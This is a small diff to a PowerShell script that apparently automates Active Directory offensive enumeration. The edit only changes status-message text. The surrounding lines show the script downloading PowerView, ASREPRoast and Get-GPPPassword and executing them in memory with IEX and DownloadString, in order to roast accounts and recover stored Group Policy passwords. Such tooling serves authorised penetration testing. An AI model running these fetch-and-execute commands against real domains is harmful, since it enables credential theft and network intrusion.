@@ -124,7 +124,7 @@ $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCrede
 
 #Download PowerView from specified URL or from GitHub.
 try {
-	Write-Host "Downloading Powerview | " -NoNewLine
+	Write-Host "[>]Downloading Powerview | " -NoNewLine
 	
 	if (Test-Path .\PowerView.ps1){
 		Write-Host "[Skipping Download] PowerView.ps1 Present | " -NoNewLine
@@ -198,7 +198,7 @@ if ($Mode -eq 'Basic') {
 }
 elseif ($Mode -eq 'Roasting') {
 	try {
-		Write-Host "Downloading ASREPRoast | " -NoNewLine
+		Write-Host "[>]Downloading ASREPRoast | " -NoNewLine
 		Write-Host "$ASREPRoastURL | " -NoNewLine
 		IEX $webclient.DownloadString($ASREPRoastURL)
 		Write-Host "Success" -ForegroundColor Green
@@ -246,7 +246,7 @@ elseif ($Mode -eq 'Special') {
 }
 elseif ($Mode -eq 'SYSVOL') {
 	try {
-		Write-Host "Downloading Get-GPPPassword | " -NoNewLine
+		Write-Host "[>]Downloading Get-GPPPassword | " -NoNewLine
 		Write-Host "$GetGPPPasswordURL | " -NoNewLine
 		IEX $webclient.DownloadString($GetGPPPasswordURL)
 		Write-Host "Success" -ForegroundColor Green
